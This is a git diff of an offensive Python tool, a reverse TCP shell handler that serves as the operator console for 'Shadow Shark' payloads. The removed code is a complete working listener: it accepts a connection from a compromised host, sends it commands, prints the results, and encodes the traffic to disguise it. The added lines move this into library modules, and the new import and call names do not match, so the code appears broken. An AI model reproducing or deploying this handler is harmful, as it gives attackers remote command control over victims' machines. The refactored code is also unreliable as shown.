@@ -4,165 +4,13 @@ This tool is a full fledged reverse TCP handler used to interact with Shadow Sha
 
 @author: Mr. Shark Spam Bot
 """
-import argparse
-import socket
-import sys
-import codecs
-import json
 import readline
-from lib import CadaverousCipher as cc
-
-def get_arguments():
-    '''Get the lhost and lport.'''
-    parser = argparse.ArgumentParser(description='''This tool is a full fledged reverse TCP handler
-used to interact with Shadow Shark payloads. Created by Mr. Shark Spam Bot.''')
-    parser.add_argument('-lh', '--lhost', dest='lhost', required=True, type=str,
-                        help='Your IP address.')
-    parser.add_argument('-lp', '--lport', dest='lport', required=True, type=int,
-                        help='The port to listen for connections on.')
-    parser.add_argument('-e', '--encryption', dest='encryption', required=True,
-                        type=str, help='The encryption used for sent and recieved data.')
-    options = parser.parse_args()
-    lhost = options.lhost
-    lport = options.lport
-    encryption = options.encryption.lower()
-    dictionary_key = {}
-    try:
-        socket.inet_aton(lhost)
-    except socket.error:
-        parser.error('Invalid value specified for LHOST.')
-    if lhost.count('.') != 3:
-        parser.error('Invalid value specified for LHOST.')
-    if encryption not in ['hex', 'base64', 'cadaverouscipher']:
-        parser.error('Only hex, base64, and CadaverousCipher encryptions are supported.')
-    if encryption == 'cadaverouscipher':
-        try:
-            with open('dictionary_key.json', 'r') as dictionary_key:
-                dictionary_key = json.load(dictionary_key)
-        except FileNotFoundError:
-            parser.error('The file dictionary_key.json does not exist in the ShadowSharkReverseShell directory.')
-        except PermissionError:
-            parser.error('Root permissions are needed in order to read the file dictionary_key.json.')
-        except json.decoder.JSONDecodeError:
-            parser.error('Invalid key found in dictionary_key.json.')
-    return [lhost, lport, encryption, dictionary_key]
-
-def encryption_handler(text, encode=False, decode=False):
-    '''Encode or decode text using hex or base64.'''
-    encryption = arguments[2]
-    dictionary_key = arguments[3]
-    if encode is True:
-        new_text = text.encode()
-        if encryption == 'hex':
-            new_text = codecs.encode(new_text, encoding='hex')
-        if encryption == 'base64':
-            new_text = codecs.encode(new_text, encoding='base64')
-        new_text = new_text.decode()
-        if encryption == 'cadaverouscipher':
-            new_text = cc.encrypt(new_text, dictionary_key)
-        new_text = json.dumps(new_text)
-        new_text = new_text.encode()
-    if decode is True:
-        new_text = json.loads(text)
-        new_text = new_text.encode()
-        if encryption == 'hex':
-            new_text = codecs.decode(new_text, encoding='hex')
-        if encryption == 'base64':
-            new_text = codecs.decode(new_text, encoding='base64')
-        new_text = new_text.decode()
-        if encryption == 'cadaverouscipher':
-            new_text = cc.decrypt(new_text, dictionary_key)
-    return new_text
-
-def listen():
-    '''Accept the first incoming TCP connection.'''
-    try:
-        rev_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        rev_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-        lhost = arguments[0]
-        lport = arguments[1]
-        try:
-            rev_socket.bind((lhost, lport))
-        except OSError:
-            print(f'{RED}\n[-] LHOST is not set to your IP or a process is currently running on LPORT.{NORMAL}')
-            print(f'{RED}[-] Terminating program.{NORMAL}')
-            sys.exit()
-        rev_socket.listen(1)
-        print(f'{BLUE}[*] A reverse TCP handler on {lhost}:{lport} has successfully started...{NORMAL}')
-        connection, address = rev_socket.accept()
-        return [rev_socket, connection, address]
-    except KeyboardInterrupt:
-        print(f'{YELLOW}\n[+] Ctrl + c detected.{NORMAL}')
-        print(f'{RED}[-] Terminating program.{NORMAL}')
-        rev_socket.close()
-        sys.exit()
+import lib.ShadowShark.parser
+import lib.ShadowShark.listener
 
 def main():
-    '''Interact with the target by using a reverse TCP shell.'''
-    try:
-        rev_socket, connection, address = listen()
-        rhost = address[0]
-        rport = address[1]
-        print(f'{GREEN}[+] A TCP connection from {rhost}:{rport} has been received.\n{NORMAL}')
-
-        try:
-            while True:
-                connection.send(encryption_handler('directory', encode=True))
-                directory = b''
-                while True:
-                    try:
-                        directory = directory + connection.recv(1024)
-                        if not directory:
-                            break
-                        if directory[-1] == 34:
-                            break
-                    except ValueError:
-                        continue
-                try:
-                    directory = encryption_handler(directory, decode=True)
-                except json.decoder.JSONDecodeError:
-                    continue
-                command = input(f'{directory} ')
-                if command.lower().strip() == 'exit':
-                    connection.send(encryption_handler('exit', encode=True))
-                    connection.close()
-                    rev_socket.close()
-                    sys.exit()
-                if command == 'multiline':
-                    print(f'{YELLOW}\n[!] Press Ctrl + d once you are finished.{NORMAL}')
-                    command = sys.stdin.read()
-                if not command.strip():
-                    continue
-                connection.send(encryption_handler(command, encode=True))
-                recv = b''
-                while True:
-                    try:
-                        recv = recv + connection.recv(1024)
-                        if not recv:
-                            break
-                        if recv[-1] == 34:
-                            break
-                    except ValueError:
-                        continue
-                try:
-                    recv = encryption_handler(recv, decode=True)
-                except json.decoder.JSONDecodeError:
-                    continue
-                if recv.strip():
-                    print(recv.strip())
-        except ConnectionError:
-            print(f'{RED}\n[-] The reverse TCP connection was broken.{NORMAL}')
-            print(f'{RED}[-] Terminating program.{NORMAL}')
-            connection.close()
-            rev_socket.close()
-            sys.exit()
-    except KeyboardInterrupt:
-        print(f'{YELLOW}\n[+] Ctrl + c detected.{NORMAL}')
-        print(f'{RED}[-] Terminating program.{NORMAL}')
-        connection.send(encryption_handler('exit', encode=True))
-        connection.close()
-        rev_socket.close()
-        sys.exit()
+    lhost, lport, encryption, dictionary_key = parser.get_arguments()
+    listener.ShadowShark(lhost, lport, encryption, dictionary_key).main()
 
 if __name__ == '__main__':
     print('''
@@ -189,10 +37,4 @@ if __name__ == '__main__':
 \t                                           .odNMm:
 \t                                             `-/sh:
     ''')
-    NORMAL = '\033[0m'
-    BLUE = '\033[94m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    arguments = get_arguments()
     main()
